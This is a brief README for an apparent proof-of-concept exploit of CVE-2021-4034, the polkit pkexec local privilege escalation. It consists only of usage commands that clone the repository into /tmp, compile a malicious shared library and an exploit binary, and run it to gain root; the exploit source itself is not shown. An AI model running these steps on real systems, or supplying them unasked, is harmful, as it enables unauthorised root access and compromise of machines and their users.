# f_poc_cve-2021-4034

## usage

```bash
cd /tmp
git clone https://github.com/jcatala/f_poc_cve-2021-4034/
cd f_poc_cve-2021-4034
gcc -fPIC -c ISO646.c
ld -shared -shared ISO646.o -o s.so
gcc f.c -o f
./f
```
